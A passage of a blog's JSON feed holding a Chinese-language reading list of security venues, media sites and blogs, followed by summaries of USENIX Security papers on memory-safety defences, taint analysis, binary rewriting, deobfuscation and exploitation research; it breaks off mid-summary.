punctuation\">{</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n",
            "tags": [
                "fuzz"
            ]
        },
        {
            "id": "https://alazymechnaic.github.io/2023/08/22/sec-paper-list/",
            "url": "https://alazymechnaic.github.io/2023/08/22/sec-paper-list/",
            "title": "Sec_paper_list",
            "date_published": "2023-08-22T02:00:57.000Z",
            "content_html": "<h2 id=\"安全相关论文及博客汇总\"><a href=\"#安全相关论文及博客汇总\" class=\"headerlink\" title=\"安全相关论文及博客汇总\"></a>安全相关论文及博客汇总</h2><hr>\n<h3 id=\"安全会议\"><a href=\"#安全会议\" class=\"headerlink\" title=\"安全会议\"></a>安全会议</h3><ul>\n<li><strong>NDSS</strong>：  <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubmRzcy1zeW1wb3NpdW0ub3JnL25kc3MyMDIzL2FjY2VwdGVkLXBhcGVycy8=\">https://www.ndss-symposium.org/ndss2023/accepted-papers/</span></li>\n<li><strong>ACM CCS</strong>： <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2lnc2FjLm9yZy9jY3MvQ0NTMjAyMy8=\">https://www.sigsac.org/ccs/CCS2023/</span></li>\n<li><strong>USENIX</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3VzZW5peHNlY3VyaXR5MjMv\">https://www.usenix.org/conference/usenixsecurity23/</span></li>\n<li><strong>S&amp;P</strong>: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuaWVlZS1zZWN1cml0eS5vcmcvVEMvU1AyMDIzL3Byb2dyYW0tcGFwZXJzLmh0bWw=\">https://www.ieee-security.org/TC/SP2023/program-papers.html</span></li>\n</ul>\n<h3 id=\"更新活跃的安全媒体\"><a href=\"#更新活跃的安全媒体\" class=\"headerlink\" title=\"更新活跃的安全媒体\"></a>更新活跃的安全媒体</h3><ul>\n<li><strong>先知社区</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tLw==\">https://xz.aliyun.com/</span></li>\n<li><strong>安全客</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tLw==\">https://www.anquanke.com/</span></li>\n<li><strong>360 核心安全技术博客</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9ncy4zNjAubmV0Lw==\">https://blogs.360.net/</span></li>\n</ul>\n<h3 id=\"技术博客\"><a href=\"#技术博客\" class=\"headerlink\" title=\"技术博客\"></a>技术博客</h3><ul>\n<li><strong>知道创宇</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLw==\">https://paper.seebug.org/</span></li>\n<li><strong>棱角社区</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS55d2hhY2suY29tL2ZvcnVtLTU5LTEuaHRtbA==\">https://forum.ywhack.com/forum-59-1.html</span></li>\n<li><strong>奇安信攻防社区</strong>：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9mb3J1bS5idXRpYW4ubmV0L2NvbW11bml0eS9hbGwvbmV3ZXN0\">https://forum.butian.net/community/all/newest</span></li>\n</ul>\n<p><strong>Personal Blog</strong></p>\n<ul>\n<li>游戏安全：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGVyZmFyZS5uZXQv\">https://www.perfare.net/</span></li>\n<li>逆向工程：<span class=\"exturl\" data-url=\"aHR0cHM6Ly90aW55aGFjay5jb20v\">https://tinyhack.com/</span></li>\n<li>漏洞分析：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndG9hZC5naXRodWIuaW8v\">https://gtoad.github.io/</span></li>\n</ul>\n<hr>\n<h2 id=\"usenix\"><a href=\"#usenix\" class=\"headerlink\" title=\"usenix\"></a>usenix</h2><h3 id=\"Viper-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\"><a href=\"#Viper-Spotting-Syscall-Guard-Variables-for-Data-Only-Attacks\" class=\"headerlink\" title=\"Viper: Spotting Syscall-Guard Variables for Data-Only Attacks\"></a>Viper: Spotting Syscall-Guard Variables for Data-Only Attacks</h3><p>由于控制流保护技术得到广泛应用，攻击者很难修改控制数据，如函数指针，以劫持程序的控制流。相反，仅针对数据的攻击会破坏安全关键的非控制数据（关键数据），并且可以绕过所有的控制流保护措施，实施严重的攻击。以前的研究已经探索了各种方法来帮助构建或防止仅针对数据的攻击。然而，目前还没有解决方案能够自动检测程序特定的关键数据。</p>\n<p>在本文中，我们确定了一个重要的关键数据类别，即系统调用保护变量（syscall-guard variables），并提出了一组解决方案，以可扩展的方式自动检测此类变量。系统调用保护变量决定是否调用与安全相关的系统调用（syscalls），修改它们将允许攻击者向操作系统请求额外的特权。我们提出了分支强制（branch force）的方法，在执行过程中有意地翻转每个条件分支，并检查是否调用了新的与安全相关的系统调用。如果是这样，我们通过常见的内存错误进行数据流分析，估计翻转这些分支的可行性。我们构建了一个名为VIPER的工具来实现我们的想法。VIPER成功地从13个程序中检测到了34个以前未知的系统调用保护变量。我们对sqlite和v8进行了四种新的仅针对数据的攻击，可以执行任意命令或删除任意文件。VIPER在大多数程序中在五分钟内完成分析，显示了其用于发现系统调用保护变量的实用性。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvdXNlbml4c2VjdXJpdHkyMy15ZS5wZGY=\">usenixsecurity23-ye.pdf</span></p>\n<h3 id=\"Not-All-Data-are-Created-Equal-Data-and-Pointer-Prioritization-for-Scalable-Protection-Against-Data-Oriented-Attacks\"><a href=\"#Not-All-Data-are-Created-Equal-Data-and-Pointer-Prioritization-for-Scalable-Protection-Against-Data-Oriented-Attacks\" class=\"headerlink\" title=\"Not All Data are Created Equal: Data and Pointer Prioritization for Scalable Protection Against Data-Oriented Attacks\"></a><strong>Not All Data are Created Equal: Data and Pointer Prioritization for Scalable Protection Against Data-Oriented Attacks</strong></h3><p>数据导向的攻击在大多数操作系统中对最先进的防御措施变得越来越现实和有效。这些攻击操纵内存中的数据对象（数据和指针），而不改变程序的控制流。用于保护数据和指针的软件和硬件防御措施由于对所有数据对象的过度插装而遭受性能瓶颈的困扰。在这项工作中，我们提出了一种基于规则启发的数据和指针优先级（Data and Pointer Prioritization，DPP）框架，用于自动识别应用程序中的敏感内存对象，并仅保护那些敏感数据，利用现有的防御措施。我们使用Linux Flaw Project数据集、Juliet测试套件和五个用于演示数据导向攻击的真实世界程序来评估我们框架的正确性。我们的实验结果表明，DPP可以通过优先处理仅占总数据对象数量3-4%的对象来识别我们测试应用程序中的易受攻击的数据对象。我们对SPEC CPU2017整数基准套件的评估结果显示，启用了DPP的AddressSanitizer（ASan）在保护所有优先级数据对象的同时，可以将性能（吞吐量）提高1.6倍，并将运行时开销减少70%，相比默认的ASan。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly95YW9ncm91cC5jcy52dC5lZHUvZHBwLXVzZW5peC0yMy5wZGY=\">dpp-usenix-23.pdf (vt.edu)</span></p>\n<h3 id=\"sAFer-Efficient-and-Error-Tolerant-Binary-Instrumentation\"><a href=\"#sAFer-Efficient-and-Error-Tolerant-Binary-Instrumentation\" class=\"headerlink\" title=\"sAFer: Efficient and Error-Tolerant Binary Instrumentation\"></a><strong>sAFer: Efficient and Error-Tolerant Binary Instrumentation</strong></h3><p>最近在二进制插桩方面的进展主要集中在性能方面。通过静态转换代码以避免额外的运行时操作，诸如Egalito和RetroWrite等系统实现了接近零的开销。这些静态转换的安全性依赖于几个假设：(a)无错误和完整的反汇编，(b)独占使用位置无关代码，(c)代码指针识别既没有误报也没有漏报。这些假设的违反可能导致插桩程序崩溃，甚至更糟糕的是，出现延迟故障导致数据损坏或安全受损。许多早期的二进制插桩技术（如DynamoRio、Pin和BinCFI）最小化了这些假设，但代价是更高的开销，尤其是对于间接调用密集（例如C++）的应用程序。因此，一个开放的研究问题是是否可以将早期的安全性优点与最近的性能优点相结合。我们以肯定的回答这个问题，提出了一种新的插桩技术，它(a)容忍使用位置相关代码和常见的反汇编和静态分析错误，(b)在运行时检测假设违规，以防止出现未定义行为。我们的方法提供了一种优雅关闭或恢复的故障崩溃机制。我们在不牺牲性能的情况下实现了安全的插桩，开销约为2%左右。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NlY2xhYi5jcy5zdW55c2IuZWR1L3NlY2xhYi9wdWJzL3NhZmVyLnBkZg==\">safer.pdf (sunysb.edu)</span></p>\n<h3 id=\"Reassembly-is-Hard-A-Reflection-on-Challenges-and-Strategies\"><a href=\"#Reassembly-is-Hard-A-Reflection-on-Challenges-and-Strategies\" class=\"headerlink\" title=\"Reassembly is Hard: A Reflection on Challenges and Strategies\"></a><strong>Reassembly is Hard: A Reflection on Challenges and Strategies</strong></h3><p>​\t重组（Reassembly）是静态二进制重写的一个分支，如今已成为研究的焦点。然而，尽管它被广泛使用并引起了研究的兴趣，但目前还没有对重组技术和挑战进行系统的调查。在本文中，我们正式定义了当前现有的重组器中出现的不同类型的错误，并提出了一个名为REASSESSOR的自动化工具来发现这些错误。我们试图通过我们的工具和我们创建的大规模基准测试来展示当前领域面临的挑战以及如何解决这些挑战。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjNzdW1tZXJfNDM5LWtpbV9oeXVuZ3Nlb2stcHJlcHViLnBkZg==\">sec23summer_439-kim_hyungseok-prepub.pdf (usenix.org)</span></p>\n<h3 id=\"FloatZone-Accelerating-Memory-Error-Detection-using-the-Floating-Point-Unit\"><a href=\"#FloatZone-Accelerating-Memory-Error-Detection-using-the-Floating-Point-Unit\" class=\"headerlink\" title=\"FloatZone: Accelerating Memory Error Detection using the Floating Point Unit\"></a><strong>FloatZone: Accelerating Memory Error Detection using the Floating Point Unit</strong></h3><p>​\t内存消毒器（Memory sanitizers）是检测空间和时间内存错误（如缓冲区溢出和使用释放后内存）的强大工具。模糊测试器和软件测试人员通常依赖这些工具来发现错误的存在。然而，消毒器会产生显著的运行时开销。例如，最广泛使用的消毒器——地址消毒器（Address Sanitizer，ASan）会导致2倍的减速。这种开销的主要来源是消毒器检查，其中至少涉及内存查找、比较和条件分支指令。将这些检查应用于确认程序中内存访问的有效性会大大减慢执行速度。</p>\n<p>​\t我们引入了FloatZone，一种基于编译器的消毒器，使用轻量级检查利用浮点单元（FPU）来检测C/C++程序中的空间和时间内存错误。我们展示了通过单个浮点加法触发下溢异常来实现“查找、比较和分支”的综合效果，以检测内存违规访问。这种新颖的检测方法通过避免传统比较的缺点大大提高了性能：它防止了分支预测错误，通过卸载到FPU实现更高的指令级并行性，并且由于没有阴影内存，降低了缓存失效率。</p>\n<p>我们的评估结果显示，FloatZone在SPEC CPU2006和CPU2017上只产生37%的运行时开销。此外，与现有技术相比，我们测量到的模糊测试吞吐量平均增加了2.87倍。最后，我们确认FloatZone在Juliet测试套件和一系列OSS-Fuzz错误上提供了与ASan相媲美的检测能力。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvdXNlbml4c2VjdXJpdHkyMy1nb3J0ZXIucGRm\">usenixsecurity23-gorter.pdf</span></p>\n<h3 id=\"PUMM-Preventing-Use-After-Free-Using-Execution-Unit-Partitioning\"><a href=\"#PUMM-Preventing-Use-After-Free-Using-Execution-Unit-Partitioning\" class=\"headerlink\" title=\"PUMM:Preventing Use-After-Free Using Execution Unit Partitioning\"></a><strong>PUMM:Preventing Use-After-Free Using Execution Unit Partitioning</strong></h3><p>​\t关键软件通常使用内存不安全的编程语言编写，容易受到使用释放后内存和双重释放错误的威胁。这导致了对内存分配器的提案，通过策略性地延迟内存重新分配的时间，使这类错误无法被利用。然而，现有的解决方案存在运行时和内存开销高的问题。为了寻求更好的解决方案，我们提出通过对程序进行分析来识别与处理各个任务相关的代码单元。基于这样的直觉，在运行时，不应该或者几乎不应该在不同任务之间传递数据，因此，释放的内存重新分配被延迟到当前执行单元完成之后，仅仅足够长的时间来防止使用释放后内存的利用。</p>\n<p>​\t为了证明我们设计的有效性，我们在Linux上实现了一个名为PUMM的原型系统，它包括一个离线分析器和一个在线强制执行器，通过透明地封装标准库来保护C/C++二进制文件。在我们的评估中，我们对26个程序中的40个真实世界漏洞和3,000个合成漏洞进行了测试，包括像Chakra JavaScript引擎这样的复杂多线程案例。PUMM成功地阻止了所有真实世界的攻击，并仅允许了4个合成攻击，同时将内存开销降低了52.0%并且平均运行时开销仅为2.04%。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjNzdW1tZXJfMTcteWFnZW1hbm4tcHJlcHViLnBkZg==\">sec23summer_17-yagemann-prepub.pdf (usenix.org)</span></p>\n<h3 id=\"Trojan-Source-Invisible-Vulnerabilities\"><a href=\"#Trojan-Source-Invisible-Vulnerabilities\" class=\"headerlink\" title=\"Trojan Source: Invisible Vulnerabilities\"></a><strong>Trojan Source: Invisible Vulnerabilities</strong></h3><p>​\t我们提出了一种新型攻击，即对源代码进行恶意编码，使其在编译器和人眼看来有所不同。这种攻击利用文本编码标准（如 Unicode）中的微妙之处产生源代码，其标记的逻辑编码顺序与显示顺序不同，从而导致人类代码审查员无法直接感知的漏洞。我们称之为 “源代码木马 “攻击，它对第一方软件和整个行业的供应链破坏都构成了直接威胁。我们介绍了 C、C++、C#、JavaScript、Java、Rust、Go、Python SQL、Bash、Assembly 和 Solidity 中的源代码木马攻击实例。我们提出了明确的编译器级防御措施，并介绍了可在编译器升级时部署到编辑器、资源库和构建流水线中的其他缓解控制措施，以阻止这种攻击。我们记录了针对这些漏洞的全行业协同披露；由于这些漏洞影响了大多数编译器、编辑器和软件源，因此我们通过这次演习了解了不同公司、开源社区和其他利益相关者如何应对漏洞披露。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvdXNlbml4c2VjdXJpdHkyMy1ib3VjaGVyLnBkZg==\">usenixsecurity23-boucher.pdf</span></p>\n<h3 id=\"Arbiter-Bridging-the-Static-and-Dynamic-Divide-in-Vulnerability-Discovery-on-Binary-Programs\"><a href=\"#Arbiter-Bridging-the-Static-and-Dynamic-Divide-in-Vulnerability-Discovery-on-Binary-Programs\" class=\"headerlink\" title=\"Arbiter: Bridging the Static and Dynamic Divide in Vulnerability Discovery on Binary Programs\"></a><strong>Arbiter: Bridging the Static and Dynamic Divide in Vulnerability Discovery on Binary Programs</strong></h3><p>尽管目前最先进的二进制程序分析方法在发现漏洞方面非常有效，但其准确性和可扩展性之间的固有权衡限制了这些方法的发展。在本文中，我们确定了一系列可帮助静态和动态漏洞检测技术的漏洞属性，提高了前者的精确性和后者的可扩展性。通过精心整合静态和动态技术，我们在真实世界的程序中大规模地检测出了表现出这些特性的漏洞。</p>\n<p>我们实施了我们的技术，在分析二进制代码方面取得了一些进展，并创建了一个名为 ARBITER 的原型。我们通过对四类常见漏洞的大规模评估，证明了我们方法的有效性： CWE-131（缓冲区大小计算错误）、CWE-252（未检查的返回值）、CWE-134（未控制的格式字符串）和 CWE-337（伪随机数生成器中的可预测种子）。我们在 Ubuntu 软件仓库中超过 76516 个 x86-64 二进制文件上评估了我们的方法，发现了新的漏洞，包括一个在编译过程中插入程序的漏洞。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjItdmFkYXlhdGgucGRm\">sec22-vadayath.pdf (usenix.org)</span></p>\n<h3 id=\"Fine-Grained-Dataflow-Tracking-with-Proximal-Gradients\"><a href=\"#Fine-Grained-Dataflow-Tracking-with-Proximal-Gradients\" class=\"headerlink\" title=\"Fine Grained Dataflow Tracking with Proximal Gradients\"></a><strong>Fine Grained Dataflow Tracking with Proximal Gradients</strong></h3><p>​\t使用动态污点分析（DTA）进行数据流跟踪是系统安全领域的一种重要方法，有很多应用，包括漏洞分析、引导模糊和侧信道信息泄漏检测。然而，DTA 从根本上受到污点标签布尔性质的限制，无法提供有关检测到的数据流重要性的信息，导致在复杂的真实世界程序中出现假阳性/阴性。</p>\n<p>​\t我们引入了近端梯度分析（PGA），这是一种基于理论的新方法，可以跟踪更准确、更精细的数据流信息。PGA 使用近似梯度（一种对无差异函数梯度的概括）来对程序中的无差异操作进行精确梯度组合。在程序上组合梯度消除了 DTA 中出现的许多数据流传播错误，并提供了有关每个测量数据流如何影响程序的更丰富信息。</p>\n<p>​\t我们在 7 个实际程序上将 PGA 原型实现与三种最先进的 DTA 实现进行了比较。结果表明，与污点跟踪（平均 20%）相比，PGA 可以将数据流跟踪的 F1 精确度提高 33%，而不会带来任何显著的开销（平均 &lt; 5%）。我们发现了 22 个漏洞（20 个经开发人员确认）和 2 个侧信道泄漏，并在测试程序中的 19 个现有 CVE 中识别出了可利用的数据流，从而进一步证明了 PGA 的有效性。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtcnlhbi5wZGY=\">sec21-ryan.pdf (usenix.org)</span></p>\n<h3 id=\"maze-Towards-Automated-Heap-Feng-Shui\"><a href=\"#maze-Towards-Automated-Heap-Feng-Shui\" class=\"headerlink\" title=\"maze: Towards Automated Heap Feng Shui\"></a><strong>maze: Towards Automated Heap Feng Shui</strong></h3><p>​\t大量内存损坏漏洞，例如堆溢出和释放后使用（UAF），只能通过堆风水等技术在特定堆布局中利用。为了给自动生成漏洞利用程序（AEG）铺平道路，需要对堆布局进行自动操作。</p>\n<p>​\t在本文中，我们提出了一种新型解决方案 MAZE，用于操作概念验证 (POC) 样本的堆布局。它首先识别堆布局基元（即输入片段或代码片段），供用户操作堆。然后，它应用一种新颖的 “挖掘与填充 “算法（Dig &amp; Fill algorithm），该算法将问题建模为线性二叉方程（Linear Diophantine Equation）并进行确定性求解，从而推断出能够生成目标堆布局的基元操作序列。</p>\n<p>​\t我们在分析引擎 S2E 的基础上实现了 MAZE 的原型，并在 PHP、Python 和 Perl 解释器、一组 CTF（夺旗）程序以及大型微基准测试中对其进行了评估。结果表明，MAZE 可以为超过 90% 的程序生成预期的堆布局。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtd2FuZy15YW4ucGRm\">sec21-wang-yan.pdf (usenix.org)</span></p>\n<h3 id=\"SELECTIVETAINT-Efficient-Data-Flow-Tracking-With-Static-Binary-Rewriting\"><a href=\"#SELECTIVETAINT-Efficient-Data-Flow-Tracking-With-Static-Binary-Rewriting\" class=\"headerlink\" title=\"SELECTIVETAINT: Efficient Data Flow Tracking With Static Binary Rewriting\"></a>SELECTIVETAINT: Efficient Data Flow Tracking With Static Binary Rewriting</h3><p>污点分析已被广泛应用于许多安全应用中，如漏洞检测、信息流跟踪、恶意软件分析和协议逆向工程。最先进的污点分析工具通常建立在动态二进制仪表之上，对每一条可能的指令进行检测，并依赖运行时信息来判断特定指令是否涉及污点，因此通常会产生很高的性能开销。本文介绍了针对二进制可执行文件的高效选择性污点分析框架 SelectiveTaint。其主要思想是利用静态二进制重写代替动态二进制工具，选择性地对涉及污点分析的指令进行工具化。在高层次上，SelectiveTaint 会静态扫描二进制代码中感兴趣的污点源，利用值集分析保守地确定指令操作数是否需要污点分析，然后选择性地对感兴趣的指令进行污点分析。我们实现了 SelectiveTaint，并用一组二进制程序对其进行了评估，其中包括 16 个 coreutils（侧重于文件 I/O）和 5 个网络守护程序（侧重于网络 I/O），如 nginx 网络服务器。评估结果表明，与最先进的动态污点分析框架相比，SelectiveTaint 静态检测的二进制程序性能更优越（例如，比 libdft 快 1.7 倍）。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtY2hlbi1zYW5jaHVhbi5wZGY=\">sec21-chen-sanchuan.pdf (usenix.org)</span></p>\n<h3 id=\"MBA-Blast-Unveiling-and-Simplifying-Mixed-Boolean-Arithmetic-Obfuscation\"><a href=\"#MBA-Blast-Unveiling-and-Simplifying-Mixed-Boolean-Arithmetic-Obfuscation\" class=\"headerlink\" title=\"MBA-Blast: Unveiling and Simplifying Mixed Boolean-Arithmetic Obfuscation\"></a><strong>MBA-Blast: Unveiling and Simplifying Mixed Boolean-Arithmetic Obfuscation</strong></h3><p>​\t混合布尔算术 (MBA) 混淆是一种执行从简单表达式到难以理解和分析的表示的语义保留转换的方法。 更具体地说，这种混淆技术由算术运算（例如 ADD 和 IMUL）和布尔运算（例如 AND、OR 和 NOT）的混合使用组成。 经过 MBA 混淆的二进制代码可以有效地隐藏静态和动态逆向工程中的秘密数据/算法，包括利用 SMT 求解器的高级分析。 不幸的是，针对 MBA 的反混淆研究仍处于起步阶段：最先进的解决方案（例如模式匹配、位爆破和程序合成）要么遭受严重的性能损失，要么是为特定的 MBA 模式设计的，要么生成太多的代码。 在实践中会导致错误的简化。</p>\n<p>​\t在本文中，我们首先揭秘 MBA 混淆的底层机制。 我们的深入研究揭示了 1 位变量和 n 位变量之间 MBA 转换的隐藏双向特征。 我们利用这一特性并提出了一种可行的解决方案，通过 MBA 混淆来有效地反混淆代码。 我们的主要见解是 MBA 转换在 1 位和 n 位变量上的行为方式相同。 我们提供了数学证明来保证这一发现的正确性。 我们进一步开发了一种新技术，通过 1 位空间的算术缩减将 MBA 表达式简化为正常的简单形式。 我们将这个想法实现为一个名为 MBA-Blast 的开源原型，并在包含约 10,000 个 MBA 表达式的综合数据集上对其进行了评估。 我们还在现实世界的二进制代码反混淆场景中测试了我们的方法，这表明 MBA-Blast 可以帮助人类分析师充分利用 SMT 求解器的优势。 与现有工作相比，MBA-Blast 是最通用、最高效的 MBA 反混淆技术； 它具有坚实的理论基础，并且成功率最高，而开销可以忽略不计。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtbGl1LWJpbmJpbi5wZGY=\">sec21-liu-binbin.pdf (usenix.org)</span></p>\n<h3 id=\"VScape-Assessing-and-Escaping-Virtual-Call-Protections\"><a href=\"#VScape-Assessing-and-Escaping-Virtual-Call-Protections\" class=\"headerlink\" title=\"VScape: Assessing and Escaping Virtual Call Protections\"></a><strong>VScape: Assessing and Escaping Virtual Call Protections</strong></h3><p>​\t许多控制流完整性（CFI）解决方案已被提出，用于保护间接控制传递（ICT），包括C++虚函数调用。评估这些防御方案的安全性保证是重要但困难的。在实践中，对于一个（强）防御方案，通常需要大量的手工工作来评估在给定特定（弱）漏洞时是否可以被绕过。现有的自动化利用生成解决方案，用于评估漏洞的可利用性，尚未解决这个问题。</p>\n<p>​\t在本文中，我们指出了一系列不破坏C++ ABI（应用程序二进制接口）的虚函数保护方案容易受到先进的COOPLUS攻击的威胁，即使给定的漏洞很弱。然后，我们提出了一个名为VScape的解决方案，用于评估虚函数保护方案对这种攻击的有效性。我们开发了VScape的原型，并利用它评估了11个CFI解决方案和14个包含Firefox和PyQt在内的C++应用程序的已知漏洞。结果表明，现实世界的应用程序存在大量可利用的虚函数调用，并且VScape可以用于生成可绕过已部署防御方案的工作利用程序，通过利用弱漏洞实现绕过。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtY2hlbi1rYWl4aWFuZy5wZGY=\">sec21-chen-kaixiang.pdf (usenix.org)</span></p>\n<h3 id=\"Precise-and-Scalable-Detection-of-Use-after-Compacting-Garbage-Collection-Bugs\"><a href=\"#Precise-and-Scalable-Detection-of-Use-after-Compacting-Garbage-Collection-Bugs\" class=\"headerlink\" title=\"Precise and Scalable Detection of Use-after-Compacting-Garbage-Collection Bugs\"></a><strong>Precise and Scalable Detection of Use-after-Compacting-Garbage-Collection Bugs</strong></h3><p>​\t压缩垃圾收集(compact-gc)是一种通过重新安排活动对象和使用地址表更新其引用来提高内存利用率和减少内存碎片的方法。如果在compact-gc之后使用了未在地址表中注册的对象引用，则可能存在严重的use-after-free错误，因为活动对象可能会移动，但在compact-gc之后不会更新引用。我们将此称为use-after-compact-gc (use-after-cgc)错误。以前的工具已经尝试使用特定于目标的启发式方法静态地检测这些错误。然而，由于它们的路径不敏感分析和不精确的目标特异性启发式，它们有很高的假阳性和假阴性。</p>\n<p>​\t在本文中，我们提出了一个精确的、可扩展的静态分析器CGSan，用于查找use-after-cgc错误。CGSan通过过程内静态符号污染分析检测cgc后使用的候选错误，并通过约束不足的定向符号执行检查它们的可行性。为了减轻过程内分析的不完整性，我们采用了基于类型的污染策略。对于可扩展性，我们建议使用定向过程间控制流图，它通过排除与检查可行性无关的路径来减少搜索空间，以及定向调度，它优先考虑路径以快速检查可行性。我们在Google V8和Mozilla SpiderMonkey上评估了CGSan，我们发现了13个独特的使用后cgc错误，只有2个假阳性，而之前的两个工具遗漏了10个错误，总共有34个假阳性.</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtaGFuLWh5dW5nc2Vvay5wZGY=\">sec21-han-hyungseok.pdf (usenix.org)</span></p>\n<h3 id=\"FlowDist-Multi-Staged-Refinement-Based-Dynamic-Information-Flow-Analysis-for-Distributed-Software-Systems\"><a href=\"#FlowDist-Multi-Staged-Refinement-Based-Dynamic-Information-Flow-Analysis-for-Distributed-Software-Systems\" class=\"headerlink\" title=\"FlowDist: Multi-Staged Refinement-Based Dynamic Information Flow Analysis for Distributed Software Systems\"></a><strong>FlowDist: Multi-Staged Refinement-Based Dynamic Information Flow Analysis for Distributed Software Systems</strong></h3><p>​\t动态信息流分析(DIFA)支持各种安全应用，如恶意软件分析和漏洞发现。然而，由于适用性、可移植性和可伸缩性方面的障碍，传统的DIFA方法对分布式软件的效用有限。我们提出了FlowDist，这是一个通用分布式软件的DIFA，可以克服这些挑战。FlowDist工作在纯应用程序级别，避免了平台定制，因此实现了高可移植性。它从全局部分顺序执行事件中推断出隐式的进程间依赖关系，以解决分布式软件的适用性。最重要的是，它为应用程序级DIFA引入了一种基于多阶段细化的方案，在这种方案中，通过廉价的预分析产生的方法级结果减少了昂贵的数据流分析，从而在保持有效性的同时实现了高可伸缩性。我们在12个真实的分布式系统上对FlowDist与两种同类工具进行了评估，结果显示其在实际效率和可扩展性方面具有卓越的有效性。它发现了18个已知漏洞和24个新漏洞，其中17个已确认，2个已修复。我们还提出并评估了FlowDist的两种替代设计，包括设计理由和不同的主题住宿。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjEtZnUteGlhb3Fpbi5wZGY=\">sec21-fu-xiaoqin.pdf (usenix.org)</span></p>\n<h3 id=\"Symbolic-execution-with-SymCC-Don’t-interpret-compile\"><a href=\"#Symbolic-execution-with-SymCC-Don’t-interpret-compile\" class=\"headerlink\" title=\"Symbolic execution with SymCC: Don’t interpret, compile!\"></a><strong>Symbolic execution with SymCC: Don’t interpret, compile!</strong></h3><p>​\t实际符号执行的主要障碍是速度，特别是与模糊测试等接近本地速度的解决方案相比。我们提出了一种基于编译的符号执行方法，其性能优于最先进的实现数量级。我们介绍了SymCC，这是一个基于llvm的C和c++编译器，它将concolic执行构建到二进制文件中。它可以被软件开发人员用作clang和clang++的临时替代品，并且我们展示了如何轻松地添加对其他语言的支持。与KLEE相比，SymCC的速度快了三个数量级，平均快了12个数量级。它的性能也优于Qsym, Qsym是一个最近表现出比其他实现有很大性能改进的系统，最高可达两个数量级，平均为10倍。在真实的软件上使用它，我们发现我们的方法始终达到更高的覆盖率，并且我们在经过大量测试的OpenJPEG项目中发现了两个漏洞，这些漏洞已经被项目维护者确认并分配了CVE标识符。</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9zeXN0ZW0vZmlsZXMvc2VjMjAtcG9lcGxhdS5wZGY=\">sec20-poeplau.pdf (usenix.org)</span></p>\n<h3 id=\"Everything-Old-is-New-Again-Binary-Security-of-WebAssembly\"><a href=\"#Everything-Old-is-New-Again-Binary-Security-of-WebAssembly\" class=\"headerlink\" title=\"Everything Old is New Again: Binary Security of WebAssembly\"></a><strong>Everything Old is New Again: Binary Security of WebAssembly</strong></h3><p>​\tWebAssembly是一种越来越流行的编译目标，通过严格分离代码和数据、强制类型和限制间接控制流，它被设计成在浏览器和其他平台上安全运行代码。尽管如此，内存不安全源语言中的漏洞可能会转化为WebAssembly二进制文件中的漏洞。在本文中，我们分析了WebAssembly二进制文件中的漏洞可被利用的程度，以及与本机代码的比较。我们发现许多经典的漏洞，由于常见的缓解措施，在原生二进制文件中不再被利用，在WebAssembly中完全暴露出来。此外，WebAssembly支持独特的攻击，例如覆盖假定的常量数据或使用堆栈溢出操作堆。我们提出了一组攻击原语，使攻击者能够(i)写入任意内存，(ii)覆盖敏感数据，以及(iii)通过转移控制流或操纵主机环境来触发意外行为。我们提供了一组易受攻击的概念验证应用程序以及完整的端到端漏洞，涵盖了三个WebAssembly平台。对编译到WebAssembly的实际二进制文件和SPEC 